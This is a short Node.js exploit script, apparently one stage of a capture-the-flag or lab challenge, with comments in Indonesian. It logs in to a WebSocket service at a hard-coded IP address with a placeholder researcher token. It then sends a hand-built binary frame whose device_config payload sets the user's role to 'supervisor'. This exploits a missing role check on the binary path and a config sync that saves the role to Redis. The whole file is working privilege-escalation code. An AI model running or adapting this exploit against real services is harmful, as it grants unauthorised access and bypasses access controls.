// stage2_ws_binary_frame.js
// Bug #2 (binary path skip role check) + Bug #3 (syncConfig persist role ke Redis)
// Kirim WS binary frame device_config {role: supervisor} -> SET role:<user_id> "supervisor"
const WebSocket = require('ws');
const TOKEN = "<JWT researcher, wallet >= 200>";
const ws = new WebSocket("ws://15.232.64.175:13403/");

ws.on("open", () => {
    // MSG 1: auth (text frame)
    ws.send(JSON.stringify({ type: "auth", token: TOKEN }));
});

ws.on("message", (data) => {
    const text = data.toString();
    if (text.includes("telemetry")) return;     // ignore telemetry noise
    console.log("[<]", text);

    if (text.includes("auth_ok")) {
        // MSG 2: binary frame device_config (BUG #2: no role check)
        // Format: [type:1B][length:4B BE][payload UTF-8], type = WS_MAGIC = 1
        const payload = JSON.stringify({
            type: "device_config",
            data: { role: "supervisor", qbit_threshold: 0.99 }
        });
        const buf = Buffer.from(payload, "utf8");
        const frame = Buffer.alloc(5 + buf.length);
        frame.writeUInt8(1, 0);               // type = WS_MAGIC (1)
        frame.writeUInt32BE(buf.length, 1);   // length (4 byte big-endian)
        buf.copy(frame, 5);                   // payload
        ws.send(frame, { binary: true });
        console.log("[>] binary frame sent (type=1, " + frame.length + " bytes)");
    } else if (text.includes("binary_config_updated")) {
        ws.close();
    }
});

ws.on("close", () => process.exit(0));
ws.on("error", (e) => { console.log("[!]", e.message); process.exit(1); });
setTimeout(() => { ws.close(); process.exit(0); }, 10000);
